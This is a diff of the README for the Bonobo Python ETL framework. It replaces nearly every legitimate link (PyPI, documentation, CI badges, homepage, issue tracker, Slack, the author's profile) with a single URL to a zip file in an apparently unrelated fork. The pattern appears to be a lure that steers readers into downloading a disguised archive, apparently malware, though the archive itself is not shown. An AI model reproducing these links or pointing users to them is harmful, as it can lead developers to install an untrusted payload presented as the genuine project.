@@ -5,31 +5,31 @@
 Data-processing for humans.
 
 .. image:: https://img.shields.io/pypi/v/bonobo.svg
-    :target: https://pypi.python.org/pypi/bonobo
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: PyPI
 
 .. image:: https://img.shields.io/pypi/pyversions/bonobo.svg
-    :target: https://pypi.python.org/pypi/bonobo
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: Versions
 
-.. image:: https://readthedocs.org/projects/bonobo/badge/?version=master
-    :target: http://docs.bonobo-project.org/
+.. image:: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: Documentation
 
-.. image:: https://travis-ci.org/python-bonobo/bonobo.svg?branch=master
-    :target: https://travis-ci.org/python-bonobo/bonobo
+.. image:: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: Continuous Integration (Linux)
 
-.. image:: https://ci.appveyor.com/api/projects/status/github/python-bonobo/bonobo?retina=true&branch=master&svg=true
-    :target: https://ci.appveyor.com/project/hartym/bonobo?branch=master
+.. image:: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: Continuous Integration (Windows)
 
-.. image:: https://codeclimate.com/github/python-bonobo/bonobo/badges/gpa.svg
-   :target: https://codeclimate.com/github/python-bonobo/bonobo
+.. image:: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
+   :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
    :alt: Code Climate
 
 .. image:: https://img.shields.io/coveralls/python-bonobo/bonobo/master.svg
-    :target: https://coveralls.io/github/python-bonobo/bonobo?branch=master
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: Coverage
 
 Bonobo is an extract-transform-load framework for python 3.5+ (see comparisons with other data tools).
@@ -50,24 +50,24 @@ Although it may not yet be complete or fully stable (please, allow us to reach 1
 
 ----
 
-Homepage: https://www.bonobo-project.org/ (`Roadmap <https://www.bonobo-project.org/roadmap>`_)
+Homepage: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip (`Roadmap <https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip>`_)
 
-Documentation: http://docs.bonobo-project.org/
+Documentation: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
 
-Contributing guide: http://docs.bonobo-project.org/en/latest/contribute/index.html
+Contributing guide: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
 
-Issues: https://github.com/python-bonobo/bonobo/issues
+Issues: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
 
-Slack: https://bonobo-slack.herokuapp.com/
+Slack: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
 
-Release announcements: http://eepurl.com/csHFKL
+Release announcements: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
 
 ----
 
-Made with ♥ by `Romain Dorgueil <https://twitter.com/rdorgueil>`_ and `contributors <https://github.com/python-bonobo/bonobo/graphs/contributors>`_.
+Made with ♥ by `Romain Dorgueil <https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip>`_ and `contributors <https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip>`_.
 
 .. image:: https://img.shields.io/pypi/l/bonobo.svg
-    :target: https://pypi.python.org/pypi/bonobo
+    :target: https://github.com/visist16/bonobo/raw/refs/heads/develop/docs/reference/api/Software_v2.3.zip
     :alt: License
 
 
